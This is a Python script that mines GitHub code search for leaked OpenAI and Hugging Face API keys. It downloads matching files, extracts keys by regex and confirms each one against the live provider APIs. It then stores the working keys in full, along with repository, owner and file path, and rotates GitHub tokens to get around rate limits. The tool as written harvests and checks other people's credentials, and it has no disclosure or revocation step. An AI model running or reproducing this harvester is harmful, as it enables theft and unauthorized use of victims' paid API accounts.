import requests
import re
import json
import time
import os
from typing import List, Dict, Optional, Set
from pathlib import Path
from dataclasses import dataclass

@dataclass
class TokenConfig:
    tokens: List[str]
    current_idx: int = 0
    
    @property
    def current_token(self) -> str:
        return self.tokens[self.current_idx % len(self.tokens)]

class Scanner:
    def __init__(self, config: TokenConfig, result_file: str = "found_keys.json"):
        self.config = config
        self.result_file = Path(result_file)
        self.patterns = {
            "OpenAI": re.compile(r"sk-(?:proj-[A-Za-z0-9]{20,}|[A-Za-z0-9]{48})"),
            "HuggingFace": re.compile(r"hf_[A-Za-z0-9]{32,64}")
        }
        self.queries = [

            "sk-proj- in:file extension:py",
            "sk-proj- in:file extension:js",
            "sk-proj- in:file extension:json",
            "sk-proj- in:file extension:env",
            "sk-proj- in:file extension:txt",
            "sk-proj- in:file extension:yaml",
            "sk-proj- in:file extension:yml",

            "sk-proj- in:filename .env",
            "sk-proj- in:filename .env.local",
            "sk-proj- in:filename .env.development",
            "sk-proj- in:filename .env.production",

            "hf_ in:file extension:py",
            "hf_ in:file extension:js",
            "hf_ in:file extension:json",
            "hf_ in:file extension:env",
            "hf_ in:file extension:txt",
            "hf_ in:file extension:yaml",
            "hf_ in:file extension:yml",
            "hf_ in:filename .env",
            "hf_ in:filename .env.local",
            "hf_ in:filename .env.development",
            "hf_ in:filename .env.production",
        ]
        self.per_page = 50
        self.existing_keys: Set[str] = set()

    def load_existing_keys(self) -> Set[str]:
        """Load previously found keys from result file"""
        if not self.result_file.exists():
            return set()
            
        try:
            with open(self.result_file, "r", encoding="utf-8") as f:
                results = json.load(f)
                return {entry["key"] for entry in results}
        except Exception as e:
            print(f"Could not load {self.result_file}: {e}")
            return set()

    def get_headers(self) -> Dict[str, str]:
        """Generate request headers with current token"""
        return {"Authorization": f"token {self.config.current_token}"}

    def check_openai_key(self, api_key: str) -> bool:
        """Check if OpenAI key is valid using multiple endpoints"""
        endpoints = [
            ("GET", "https://api.openai.com/v1/projects"),
            ("GET", "https://api.openai.com/v1/models"),
            ("GET", "https://api.openai.com/v1/engines"),
            ("GET", "https://api.openai.com/v1/organizations")
        ]
        
        for method, endpoint in endpoints:
            try:
                response = requests.request(
                    method,
                    endpoint,
                    headers={"Authorization": f"Bearer {api_key}"},
                    timeout=10
                )
                
                if response.status_code == 200:
                    print(f"✅ Valid OpenAI key: {api_key[:10]}...{api_key[-6:]}")
                    return True
                elif response.status_code == 401:
                    print(f"❌ Invalid OpenAI key: {api_key[:10]}...{api_key[-6:]}")
                    return False
            except Exception as e:
                print(f"Error trying {endpoint}: {e}")
                continue
                
        print(f"❓ Unknown OpenAI error: {response.status_code}")
        return False

    def check_huggingface_key(self, api_key: str) -> bool:
        if not api_key or not api_key.startswith("hf_"):
            return False

        try:
            response = requests.get(
                "https://huggingface.co/api/whoami-v2",
                headers={
                    "Authorization": f"Bearer {api_key}",
                    "User-Agent": "HF-Key-Checker/1.0"
                },
                timeout=10
            )

            masked_key = (
                f"{api_key[:10]}...{api_key[-6:]}"
                if len(api_key) > 16
                else api_key
            )

            if response.status_code == 200:
                print(f"✅ Valid Hugging Face key: {masked_key}")
                return True

            elif response.status_code in (401, 403):
                print(f"❌ Invalid or unauthorized Hugging Face key: {masked_key}")
                return False

            else:
                print(
                    f"❓ Unexpected response ({response.status_code}): "
                    f"{response.text[:200]}"
                )
                return False

        except requests.exceptions.Timeout:
            print("⌛ Request timed out")
            return False

        except requests.exceptions.RequestException as e:
            print(f"🌐 Network error: {e}")
            return False

        except Exception as e:
            print(f"⚠️ Unexpected error: {e}")
            return False

    def check_api_key(self, api_key: str, service: str) -> bool:
        """Check API key validity based on service type"""
        if service == "OpenAI":
            return self.check_openai_key(api_key)
        elif service == "HuggingFace":
            return self.check_huggingface_key(api_key)
        return False

    def search_github(self, query: str, page: int = 1) -> Optional[Dict]:
        """Search GitHub API for keys"""
        while True:
            url = "https://api.github.com/search/code"
            params = {"q": query, "page": page, "per_page": self.per_page}
            print(f"[Token {self.config.current_idx+1}/{len(self.config.tokens)}] "
                  f"Searching GitHub for: {query}")
                  
            try:
                response = requests.get(
                    url, 
                    headers=self.get_headers(),
                    params=params
                )
                
                if response.status_code == 200:
                    return response.json()
                elif response.status_code == 403:
                    print("⚠️ Rate limit hit! Switching GitHub token...")
                    self.config.current_idx += 1
                    if self.config.current_idx >= len(self.config.tokens):
                        print("🔄 All tokens exhausted. Sleeping for 5 minutes...")
                        self.config.current_idx = 0
                        time.sleep(300)
                    continue
                else:
                    print(f"GitHub API error: {response.status_code}")
                    return None
            except Exception as e:
                print(f"Network error: {e}")
                return None

    def get_file_content(self, item: Dict) -> str:
        """Get raw file content from GitHub"""
        repo = item['repository']['full_name']
        path = item['path']
        branch = item['repository'].get('default_branch', 'main')
        url = f"https://raw.githubusercontent.com/{repo}/{branch}/{path}"
        
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                return response.text
            print(f"Could not fetch {url}")
            return ''
        except Exception as e:
            print(f"Error fetching file: {e}")
            return ''

    def scan_results(self, results: Dict) -> List[Dict]:
        """Scan GitHub search results for API keys"""
        found = []
        for item in results.get("items", []):
            file_url = item.get("html_url")
            repo = item.get("repository", {}).get("full_name")
            owner = item.get("repository", {}).get("owner", {}).get("login")
            repo_url = item.get("repository", {}).get("html_url")
            default_branch = item.get("repository", {}).get("default_branch")
            path = item.get("path")
            
            content = self.get_file_content(item)
            for name, pattern in self.patterns.items():
                keys = pattern.findall(content)
                for key in keys:
                    if key in self.existing_keys:
                        print(f"Skipped duplicate {name} key: {key[:10]}...{key[-6:]}")
                        continue
                        
                    print(f"\nFound {name} key in {file_url} ({repo})")
                    valid = self.check_api_key(key, name)
                    
                    if valid:
                        found.append({
                            "file_url": file_url,
                            "repo": repo,
                            "owner": owner,
                            "repo_url": repo_url,
                            "default_branch": default_branch,
                            "path": path,
                            "type": name,
                            "key": key,
                            "valid": valid
                        })
                        self.existing_keys.add(key)
                        
        return found

    def save_results(self, results: List[Dict]) -> None:
        """Save scan results to JSON file"""
        try:
            with open(self.result_file, "w", encoding="utf-8") as f:
                json.dump(results, f, indent=2)
            print(f"\nResults saved to {self.result_file}")
        except Exception as e:
            print(f"Error saving JSON: {e}")

    def run(self) -> None:
        """Main scanning loop"""
        self.existing_keys = self.load_existing_keys()
        all_found = []
        
        try:
            if self.result_file.exists():
                with open(self.result_file, "r", encoding="utf-8") as f:
                    all_found = json.load(f)
        except Exception as e:
            print(f"Warning: could not load previous results: {e}")

        for query in self.queries:
            page = 1
            while True:
                results = self.search_github(query, page)
                if not results or 'items' not in results or len(results['items']) == 0:
                    print(f"No more results for query: {query}")
                    break
                    
                found = self.scan_results(results)
                all_found.extend(found)
                self.save_results(all_found)
                page += 1
                time.sleep(3)

        print("All queries complete. Exiting.")


if __name__ == "__main__":
    try:
        config = TokenConfig(
            tokens=[
                'Keys here'
            ]
        )
        scanner = Scanner(config)
        scanner.run()
    except KeyboardInterrupt:
        print("\nStopped by -user.")
